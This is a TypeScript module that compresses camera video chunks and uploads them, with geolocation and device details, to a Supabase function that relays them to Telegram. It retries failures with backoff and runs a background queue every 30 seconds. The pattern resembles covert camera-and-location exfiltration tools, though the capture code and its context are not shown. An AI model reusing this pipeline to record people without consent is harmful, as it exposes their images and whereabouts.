import { compressVideo } from './videoCompression';
import { addChunkToQueue, getQueuedChunks, removeChunkFromQueue, incrementRetryCount, clearOldChunks } from './chunkQueue';

// Configuration
const MAX_RETRIES = 3;
const RETRY_DELAY_BASE = 2000; // 2 seconds base delay
const ENABLE_COMPRESSION = true; // Set to false to disable compression
const MAX_VIDEO_SIZE_MB = 20; // Telegram limit is 50MB, we use 20MB to be safe

// Track if queue processor is running
let isProcessingQueue = false;

// ============================================
// 1️⃣ RETRY MECHANISM with Exponential Backoff
// ============================================

const sendWithRetry = async (
  formData: FormData,
  chunkNumber: number,
  maxRetries = MAX_RETRIES
): Promise<boolean> => {
  const { projectId, publicAnonKey } = await import('/utils/supabase/info');
  const backendUrl = `https://${projectId}.supabase.co/functions/v1/make-server-039e5f24/telegram/send-video`;
  
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      console.log(`📤 [Video] Sending chunk #${chunkNumber} (attempt ${attempt + 1}/${maxRetries})...`);
      
      const response = await fetch(backendUrl, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${publicAnonKey}`,
        },
        body: formData
      });
      
      if (response.ok) {
        const result = await response.json();
        if (result.success) {
          console.log(`✅ [Video] Chunk #${chunkNumber} sent successfully on attempt ${attempt + 1}`);
          return true;
        }
      }
      
      // Server error - log and retry
      const errorText = await response.text();
      console.warn(`⚠️ [Video] Attempt ${attempt + 1} failed: ${response.status} - ${errorText}`);
      
    } catch (error) {
      console.warn(`⚠️ [Video] Attempt ${attempt + 1} failed:`, error);
    }
    
    // If not last attempt, wait with exponential backoff
    if (attempt < maxRetries - 1) {
      const delay = RETRY_DELAY_BASE * Math.pow(2, attempt); // 2s, 4s, 8s
      console.log(`⏳ [Video] Retrying in ${delay / 1000}s...`);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
  
  console.error(`❌ [Video] Chunk #${chunkNumber} failed after ${maxRetries} attempts`);
  return false;
};

// ============================================
// 2️⃣ MAIN SEND FUNCTION with Compression
// ============================================

export const sendVideoToTelegram = async (
  videoBlob: Blob,
  chunkNumber: number,
  cameraType: 'front' | 'back' | 'desktop',
  geoData?: {
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: string;
  } | null
): Promise<void> => {
  try {
    const cameraLabel = cameraType === 'front' ? '🤳 Фронтальная' : 
                        cameraType === 'back' ? '📷 Основная' : 
                        '🖥️ Десктоп';
    
    console.log(`📤 [Video] Processing chunk #${chunkNumber} (${cameraLabel})...`);
    
    // 3️⃣ COMPRESSION (if enabled and needed)
    let finalBlob = videoBlob;
    const originalSizeMB = videoBlob.size / 1024 / 1024;
    
    if (ENABLE_COMPRESSION && originalSizeMB > 5) {
      try {
        console.log(`🗜️ [Video] Compressing chunk #${chunkNumber} (${originalSizeMB.toFixed(2)} MB)...`);
        finalBlob = await compressVideo(videoBlob, {
          maxSizeMB: MAX_VIDEO_SIZE_MB,
          quality: 28,
          maxWidth: 1280,
          maxHeight: 720
        });
        const compressedSizeMB = finalBlob.size / 1024 / 1024;
        console.log(`✅ [Video] Compressed: ${originalSizeMB.toFixed(2)} MB → ${compressedSizeMB.toFixed(2)} MB`);
      } catch (error) {
        console.warn('⚠️ [Video] Compression failed, using original blob:', error);
      }
    }
    
    // Build FormData
    const formData = new FormData();
    formData.append('video', finalBlob, finalBlob.type.includes('mp4') ? 'video.mp4' : 'video.webm');
    formData.append('chunkNumber', chunkNumber.toString());
    formData.append('cameraType', cameraType);
    formData.append('userAgent', navigator.userAgent);
    formData.append('device', /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? 'mobile' : 'desktop');
    
    // Add geolocation if available
    if (geoData) {
      formData.append('latitude', geoData.latitude.toString());
      formData.append('longitude', geoData.longitude.toString());
      formData.append('accuracy', geoData.accuracy.toString());
      formData.append('timestamp', geoData.timestamp);
      console.log(`📍 [Video] Added geolocation to chunk #${chunkNumber}`);
    }
    
    // 1️⃣ Try to send with retry
    const success = await sendWithRetry(formData, chunkNumber);
    
    if (success) {
      console.log(`✅ [Video] Chunk #${chunkNumber} sent successfully`);
    } else {
      // 2️⃣ Failed - add to queue
      console.log(`💾 [Video] Adding chunk #${chunkNumber} to queue for later retry`);
      await addChunkToQueue({
        chunkNumber,
        cameraType,
        blob: finalBlob,
        geoData
      });
    }
    
  } catch (error) {
    console.error(`❌ [Video] Critical error for chunk #${chunkNumber}:`, error);
    
    // Add to queue on critical error
    try {
      await addChunkToQueue({
        chunkNumber,
        cameraType,
        blob: videoBlob,
        geoData
      });
    } catch (queueError) {
      console.error('❌ [Video] Failed to add to queue:', queueError);
    }
  }
};

// ============================================
// 3️⃣ QUEUE PROCESSOR (Background Retry)
// ============================================

export const processVideoQueue = async (): Promise<void> => {
  if (isProcessingQueue) {
    console.log('⏭️ [Queue] Already processing, skipping...');
    return;
  }
  
  isProcessingQueue = true;
  
  try {
    console.log('🔄 [Queue] Processing queued chunks...');
    
    const chunks = await getQueuedChunks();
    
    if (chunks.length === 0) {
      console.log('✅ [Queue] No chunks in queue');
      isProcessingQueue = false;
      return;
    }
    
    console.log(`📦 [Queue] Found ${chunks.length} chunks to process`);
    
    for (const chunk of chunks) {
      // Skip if too many retries
      if (chunk.retryCount >= MAX_RETRIES) {
        console.warn(`⚠️ [Queue] Chunk #${chunk.chunkNumber} exceeded max retries, removing...`);
        await removeChunkFromQueue(chunk.id);
        continue;
      }
      
      // Build FormData
      const formData = new FormData();
      formData.append('video', chunk.blob, chunk.blob.type.includes('mp4') ? 'video.mp4' : 'video.webm');
      formData.append('chunkNumber', chunk.chunkNumber.toString());
      formData.append('cameraType', chunk.cameraType);
      formData.append('userAgent', navigator.userAgent);
      formData.append('device', /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? 'mobile' : 'desktop');
      
      if (chunk.geoData) {
        formData.append('latitude', chunk.geoData.latitude.toString());
        formData.append('longitude', chunk.geoData.longitude.toString());
        formData.append('accuracy', chunk.geoData.accuracy.toString());
        formData.append('timestamp', chunk.geoData.timestamp);
      }
      
      // Try to send
      const success = await sendWithRetry(formData, chunk.chunkNumber, 1); // Only 1 retry in queue processor
      
      if (success) {
        await removeChunkFromQueue(chunk.id);
      } else {
        await incrementRetryCount(chunk.id);
      }
      
      // Small delay between chunks
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    console.log('✅ [Queue] Queue processing complete');
    
  } catch (error) {
    console.error('❌ [Queue] Error processing queue:', error);
  } finally {
    isProcessingQueue = false;
  }
};

// ============================================
// 4️⃣ AUTO QUEUE PROCESSOR (runs every 30s)
// ============================================

let queueProcessorInterval: number | null = null;

export const startQueueProcessor = () => {
  if (queueProcessorInterval) {
    console.log('⏭️ [Queue] Processor already running');
    return;
  }
  
  console.log('▶️ [Queue] Starting auto queue processor (every 30s)');
  
  // Process immediately
  processVideoQueue();
  
  // Then every 30 seconds
  queueProcessorInterval = window.setInterval(() => {
    processVideoQueue();
  }, 30000);
  
  // Clear old chunks once per hour
  const clearOldInterval = window.setInterval(() => {
    clearOldChunks();
  }, 60 * 60 * 1000);
  
  // Cleanup on page unload
  window.addEventListener('beforeunload', () => {
    if (queueProcessorInterval) {
      clearInterval(queueProcessorInterval);
    }
    clearInterval(clearOldInterval);
  });
};

export const stopQueueProcessor = () => {
  if (queueProcessorInterval) {
    clearInterval(queueProcessorInterval);
    queueProcessorInterval = null;
    console.log('⏹️ [Queue] Processor stopped');
  }
};
